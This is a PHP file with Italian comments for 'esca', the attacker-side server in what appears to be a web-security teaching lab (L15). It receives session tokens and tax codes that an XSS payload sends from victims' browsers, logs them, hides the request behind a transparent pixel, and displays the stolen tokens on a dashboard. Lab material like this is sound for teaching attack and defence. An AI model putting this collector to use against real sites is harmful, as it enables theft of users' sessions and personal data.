<?php

/**
 * `esca` — il server dell'attaccante.
 *
 * Raccoglie i token che il payload XSS fa partire dal browser della vittima e ospita la
 * pagina usata per la dimostrazione CSRF. Sta sulla rete `frontend` ed è pubblicato, perché
 * l'infrastruttura di chi attacca è per definizione raggiungibile dalla vittima: se fosse
 * interna, il furto del token non potrebbe avvenire e il laboratorio L15 non funzionerebbe.
 *
 * Non fa parte del perimetro dell'ente: è lo strumento dello studente.
 */

$cartella = __DIR__.'/dati';
@mkdir($cartella, 0775, true);
$file = $cartella.'/raccolti.jsonl';

$percorso = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH) ?: '/';

if ($percorso === '/c') {
    if (isset($_GET['t']) && $_GET['t'] !== '') {
        $riga = [
            'quando' => gmdate('c'),
            'token' => substr((string) $_GET['t'], 0, 2000),
            'cf' => substr((string) ($_GET['cf'] ?? ''), 0, 32),
            'user_agent' => substr((string) ($_SERVER['HTTP_USER_AGENT'] ?? ''), 0, 200),
            'referer' => substr((string) ($_SERVER['HTTP_REFERER'] ?? ''), 0, 200),
        ];
        file_put_contents($file, json_encode($riga)."\n", FILE_APPEND | LOCK_EX);
    }

    // Pixel trasparente: la pagina della vittima non deve mostrare nulla di strano.
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
    exit;
}

if ($percorso === '/svuota' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    @unlink($file);
    header('Location: /');
    exit;
}

$righe = is_file($file)
    ? array_reverse(array_filter(array_map('trim', file($file))))
    : [];

header('Content-Type: text/html; charset=utf-8');
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="utf-8">
    <title>esca — raccoglitore</title>
    <style>
        body { font: 15px/1.5 system-ui, sans-serif; margin: 2rem auto; max-width: 60rem; padding: 0 1rem; background: #101418; color: #e6e6e6; }
        h1 { font-size: 1.3rem; }
        code, textarea { font-family: ui-monospace, monospace; }
        .riga { background: #1a2027; border-left: 4px solid #c0392b; padding: .75rem 1rem; margin: .75rem 0; border-radius: 4px; }
        .token { display: block; word-break: break-all; background: #0b0f13; padding: .5rem; margin-top: .4rem; border-radius: 3px; }
        .vuoto { color: #8b949e; }
        button { background: #c0392b; color: #fff; border: 0; padding: .5rem 1rem; border-radius: 4px; cursor: pointer; }
        a { color: #6cb6ff; }
    </style>
</head>
<body>
<h1>esca — raccoglitore del laboratorio</h1>
<p class="vuoto">Questa pagina non fa parte dell'Agenzia: è il server dell'attaccante.</p>
<?php if ($righe === []): ?>
    <p class="vuoto">Nessun token raccolto. Il payload deve partire dal browser della vittima.</p>
<?php else: ?>
    <form method="post" action="/svuota"><button type="submit">svuota</button></form>
    <?php foreach ($righe as $riga): $d = json_decode($riga, true) ?: []; ?>
        <div class="riga">
            <div><strong><?= htmlspecialchars($d['quando'] ?? '?') ?></strong>
                — <?= htmlspecialchars($d['cf'] ?? '') ?>
                — <?= htmlspecialchars($d['referer'] ?? '') ?></div>
            <code class="token"><?= htmlspecialchars($d['token'] ?? '') ?></code>
        </div>
    <?php endforeach; ?>
<?php endif; ?>
<p style="margin-top:2rem"><a href="/csrf.html">pagina CSRF</a></p>
</body>
</html>
